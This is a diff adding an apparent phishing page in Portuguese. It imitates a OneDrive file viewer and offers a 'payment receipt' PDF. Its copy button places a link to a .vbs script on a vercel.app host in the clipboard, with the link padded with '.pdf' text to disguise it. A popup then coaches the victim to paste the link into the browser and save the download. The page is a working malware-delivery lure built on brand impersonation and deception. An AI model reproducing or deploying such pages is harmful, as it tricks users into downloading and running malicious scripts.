@@ -1,0 +1,364 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Visualização de Arquivo - OneDrive</title>
+  <style>
+    :root {
+      --azul: #0078d4;
+      --azul-escuro: #005fa3;
+      --cinza-fundo: #f3f6fb;
+      --branco: #ffffff;
+      --cinza-texto: #555;
+      --verde: #28a745;
+      --laranja: #ff8c00;
+      --vermelho: #dc3545;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--cinza-fundo);
+      color: var(--cinza-texto);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    header {
+      background-color: var(--azul);
+      color: white;
+      padding: 1rem 2rem;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      font-size: 1.8rem;
+      margin-right: 0.5rem;
+    }
+
+    header h1 {
+      font-size: 1.4rem;
+      font-weight: 600;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem;
+    }
+
+    .file-viewer {
+      background-color: var(--branco);
+      padding: 3rem;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      max-width: 600px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .file-icon {
+      font-size: 5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .file-icon.pdf {
+      color: #F40F02;
+    }
+
+    .file-icon.vbs {
+      color: #5D5D5D;
+    }
+
+    .file-name {
+      font-size: 1.3rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+      word-break: break-all;
+    }
+
+    .file-type {
+      font-size: 0.9rem;
+      color: #888;
+      margin-bottom: 1.5rem;
+      text-transform: uppercase;
+      font-weight: 500;
+    }
+
+    .file-message {
+      font-size: 1rem;
+      color: #666;
+      margin-bottom: 2rem;
+      text-align: left;
+      background-color: #f8f9fa;
+      padding: 1rem;
+      border-radius: 8px;
+      border-left: 4px solid var(--azul);
+    }
+
+    .warning-message {
+      background-color: #fff3cd;
+      border-left-color: var(--laranja);
+      color: #856404;
+      margin-top: 1.5rem;
+    }
+
+    .action-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      margin-top: 2rem;
+      flex-wrap: wrap;
+    }
+
+    .download-button {
+      background-color: var(--azul);
+      color: white;
+      border: none;
+      padding: 0.8rem 1.8rem;
+      font-size: 1rem;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.2s;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .download-button:hover {
+      background-color: var(--azul-escuro);
+    }
+
+    .copy-button {
+      background-color: var(--verde);
+    }
+
+    .copy-button:hover {
+      background-color: #218838;
+    }
+
+    .cancel-button {
+      background-color: #6c757d;
+    }
+
+    .cancel-button:hover {
+      background-color: #5a6268;
+    }
+
+    /* Popup/modal */
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: var(--branco);
+      border-radius: 12px;
+      padding: 2rem;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+      z-index: 1000;
+      display: none;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    .popup h2 {
+      margin-bottom: 1rem;
+      color: var(--azul);
+    }
+
+    .popup p {
+      margin-bottom: 1.2rem;
+      font-size: 1rem;
+      line-height: 1.5;
+      text-align: left;
+    }
+
+    .popup .file-url {
+      background-color: #f8f9fa;
+      padding: 0.8rem;
+      border-radius: 4px;
+      margin: 1rem 0;
+      word-break: break-all;
+      font-family: monospace;
+      font-size: 0.9rem;
+      border: 1px solid #e9ecef;
+    }
+
+    .popup .buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: flex-end;
+      margin-top: 1.5rem;
+    }
+
+    .arrow {
+      position: fixed;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 2rem;
+      color: var(--azul);
+      animation: bounce 1.5s infinite;
+      z-index: 1001;
+      display: none;
+    }
+
+    @keyframes bounce {
+      0%, 100% {
+        transform: translateX(-50%) translateY(0);
+      }
+      50% {
+        transform: translateX(-50%) translateY(-10px);
+      }
+    }
+
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.4);
+      display: none;
+      z-index: 999;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translate(-50%, -60%); }
+      to { opacity: 1; transform: translate(-50%, -50%); }
+    }
+
+    @media (max-width: 600px) {
+      .file-viewer {
+        padding: 2rem 1.5rem;
+      }
+      
+      .action-buttons {
+        flex-direction: column;
+      }
+      
+      .action-buttons button {
+        width: 100%;
+      }
+      
+      .popup .buttons {
+        flex-direction: column;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-container">
+      <div class="logo">☁️</div>
+      <h1>OneDrive</h1>
+    </div>
+  </header>
+
+  <main>
+    <div class="file-viewer">
+      <div class="file-icon vbs">📄</div>
+      <div class="file-name">Comprovante-de-Pagamento.pdf</div>
+      
+      
+      <div class="file-message">
+        <p><strong>Este arquivo não pode ser visualizado diretamente no navegador.</strong></p>
+        <p>Para fazer o download, clique no botão abaixo. O link do arquivo será copiado para sua área de transferência.</p>
+      </div>
+      
+      
+      
+      <div class="action-buttons">
+        <button class="download-button copy-button" onclick="copiarLink()">
+          <span>📋</span> Copiar Link para Download
+        </button>
+        
+      </div>
+    </div>
+  </main>
+
+  <!-- Pop-up -->
+  <div id="overlay"></div>
+  <div class="popup" id="popup">
+    <h2>Link copiado com sucesso!</h2>
+    <p>O link para download do arquivo foi copiado para sua área de transferência.</p>
+    
+    <div class="file-url" id="linkCopiado"></div>
+    
+    <p><strong>Instruções:</strong></p>
+    <p>1. Cole o link na barra de endereços do seu navegador</p>
+    <p>2. Pressione Enter para iniciar o download</p>
+    <p>3. Salve o arquivo em um local seguro do seu computador</p>
+    
+    <div class="buttons">
+      <button class="download-button cancel-button" onclick="fecharPopup()">Fechar</button>
+    </div>
+  </div>
+
+  <!-- Seta -->
+  <div class="arrow" id="seta">👆</div>
+
+  <script>
+    const link = "https://filedownload-938492893.vercel.app/Comprovante-de-Pagamento.vbs?id=49Comprovante-de-Pagamento.pdf21842921742193819Comprovante-de-Pagamento.pdf28392174239298329839";
+    
+    function copiarLink() {
+      const popup = document.getElementById("popup");
+      const overlay = document.getElementById("overlay");
+      const arrow = document.getElementById("seta");
+      const hiddenLink = document.getElementById("linkCopiado");
+
+      // Copiar para área de transferência
+      navigator.clipboard.writeText(link).then(() => {
+        hiddenLink.textContent = link;
+        popup.style.display = "block";
+        overlay.style.display = "block";
+        arrow.style.display = "block";
+      }).catch(() => {
+        alert("Erro ao copiar o link. Tente novamente.");
+      });
+    }
+    
+    function fecharPopup() {
+      const popup = document.getElementById("popup");
+      const overlay = document.getElementById("overlay");
+      const arrow = document.getElementById("seta");
+      
+      popup.style.display = "none";
+      overlay.style.display = "none";
+      arrow.style.display = "none";
+    }
+    
+    function cancelarDownload() {
+      if(confirm("Tem certeza que deseja cancelar o download?")) {
+        window.location.href = "https://onedrive.live.com/";
+      }
+    }
+    
+    // Fechar popup ao clicar no overlay
+    document.getElementById('overlay').addEventListener('click', fecharPopup);
+  </script>
+
+</body>
+</html>
